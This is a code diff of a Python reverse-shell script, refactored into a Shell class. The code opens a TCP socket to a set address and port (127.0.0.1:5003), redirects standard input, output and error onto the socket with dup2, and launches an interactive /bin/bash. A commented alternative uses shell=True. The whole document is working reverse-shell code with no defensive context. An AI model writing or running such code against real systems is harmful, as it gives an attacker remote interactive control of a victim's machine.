@@ -1,6 +1,8 @@
 #!/usr/bin/env python3
+
 from subprocess import run
 import os
+
 
 # # # # # # # # # # # # # # # # # # # # # #
 #                                         #
@@ -11,7 +13,7 @@ import os
 #                                         #
 # # # # # # # # # # # # # # # # # # # # # #
 
-class shell:
+class Shell:
 
     def __init__(
             self,
@@ -19,14 +21,52 @@ class shell:
             target_port
     ):  # assign the target address and the target port
         self.target_address = target_address
-        self.target_port    = target_port
+        self.target_port = target_port
 
+    def shell(self):
+        # Change socket.SOCK_STREAM(TCP) to socket.SOCK_DRAM for UDP connection
+        socket_sock = socket.socket(
+            socket.AF_INET,  # use ipv4(AF_INET) and tcp(SOCK_STREAM) for the connection
+            socket.SOCK_STREAM
+        )
+        socket_sock.connect((
+            self.target_address,  # start a connection to the target
+            self.target_port
+        ))
 
-reverse_connection = shell(
-    "127.0.0.1", int(
-        5003
-    )
-)  # define target ip address and target port
+        dup2(
+            socket_sock.fileno(),
+            0
+        )  # return stream integer file descriptor
+        dup2(
+            socket_sock.fileno(),
+            1
+        )  # used for request I/O actions from the OS
+        dup2(
+            socket_sock.fileno(),
+            2
+        )
+
+        run(
+            [
+                "/bin/bash",
+                "-i"
+            ]
+        )  # finally run the bash console
+
+        """
+
+        Try this code below if you have any issues.
+
+        run(
+            [
+                "/bin/bash"
+            ], 
+            shell=True
+        )
+
+        """
+
 
 if __name__ == "__main__":
     from os import dup2
@@ -34,45 +74,11 @@ if __name__ == "__main__":
 
     os.system('clear')
 
-    # Change socket.SOCK_STREAM(TCP) to socket.SOCK_DRAM for UDP connection
-    socket_sock = socket.socket(
-        socket.AF_INET,  # use ipv4(AF_INET) and tcp(SOCK_STREAM) for the connection
-        socket.SOCK_STREAM
-    )
-    socket_sock.connect((
-        reverse_connection.target_address,  # start a connection to the target
-        reverse_connection.target_port
-    ))
-
-    dup2(
-        socket_sock.fileno(),
-        0
-    )  # return stream integer file descriptor
-    dup2(
-        socket_sock.fileno(),
-        1
-    )  # used for request I/O actions from the OS
-    dup2(
-        socket_sock.fileno(),
-        2
-    )
-
-    run(
-        [
-            "/bin/bash", 
-            "-i"
-        ]
-    ) # finally run the bash console
-    
-    """
-    
-    Try this code below if you have any issues.
-    
-    run(
-        ["/bin/bash"], 
-        shell=True
-    )
-    
-    """
+    reverse_connection = Shell(
+        "127.0.0.1", int(
+            5003
+        )
+    )  # define target ip address and target port
+    reverse_connection.shell()
 
     
